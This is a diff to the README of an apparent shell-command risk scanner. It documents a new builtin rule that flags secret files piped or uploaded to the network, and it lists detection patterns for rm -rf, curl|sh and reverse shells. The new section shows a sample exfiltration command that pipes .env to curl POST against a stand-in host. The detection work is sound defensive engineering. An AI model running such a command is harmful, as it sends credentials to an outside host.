@@ -156,7 +156,7 @@ install hint) — adding one is one entry plus its binary.
 | Analyzer | Surface | What it adds | Install |
 |---|---|---|---|
 | **builtin** | bash, deps, py/js, secrets | zero-dependency regex rule pack (rm -rf, force-push, `kubectl delete`, `terraform destroy`, `curl\|sh`, SQL DROP, sudo, plus a python/js reverse-shell combo heuristic and the [secrets](#secrets--whats-about-to-enter-version-control) pack) | — (always on) |
-| **sh-guard** | bash | AST classifier with pipeline **taint analysis** + MITRE ATT&CK mapping | py3.12 lib — see `analyzers.json` |
+| **sh-guard** | bash | AST classifier with pipeline **taint analysis** + MITRE ATT&CK mapping. Off by default: it scores most heredocs and pipelines 9–10, and the one shape it uniquely caught is now a builtin rule (see below). Capped at 6 if you turn it on | py3.12 lib — see `analyzers.json` |
 | **osv-scanner** | deps | CVEs from a **pinned lockfile** (unpinned manifests report ⚪) | `brew install osv-scanner` |
 | **guarddog** | deps | malicious-package heuristics (exfil, install-scripts, typosquats) | `pipx install guarddog` |
 | **gitleaks** | secrets | 170+ maintained credential rules over the same changeset, with `.gitleaks.toml` allowlisting | `brew install gitleaks` |
@@ -385,6 +385,27 @@ Rule ids are slugs of the builtin's rule labels (`AWS access key id` → `aws-ac
 gitleaks' own `RuleID`s. Renaming a builtin rule's label changes its id and invalidates entries
 that used it — the ids are derived rather than stored because the rule tuple is
 `custom_rules.json`'s public format.
+
+## Exfiltration: a combination rule
+
+A flat `(regex, score, label)` list cannot see this, because neither half is dangerous alone:
+
+```
+$ cat .env | curl -X POST -d @- https://x.io
+🔴 9/10 DANGER — riskscan [bash]
+  • [builtin:bash] secret file piped to the network (exfiltration pattern) [9/10]
+```
+
+Before the rule existed, the builtin scored that **1/10, "read-only / print"**. `exfil_score()`
+matches four shapes: a secret-bearing read piped to a network sink, a direct upload
+(`-d @file`, `-T file`, `-F x=@file`), a read redirected to `/dev/tcp/`, and an environment dump
+piped out. Templates (`.env.example`, `.env.sample`) and downloads *into* a secret file
+(`curl -o .env`) are deliberately quiet; the negatives are tested as carefully as the positives,
+because this rule is now authoritative for the pattern.
+
+This replaces what sh-guard was carried for. A deterministic rule is versioned, reviewable in a
+diff, and identical every run — you can argue about whether an upload is a 9 in code review, and
+you cannot diff a classifier's mood.
 
 ## Turning down a noisy analyzer
 
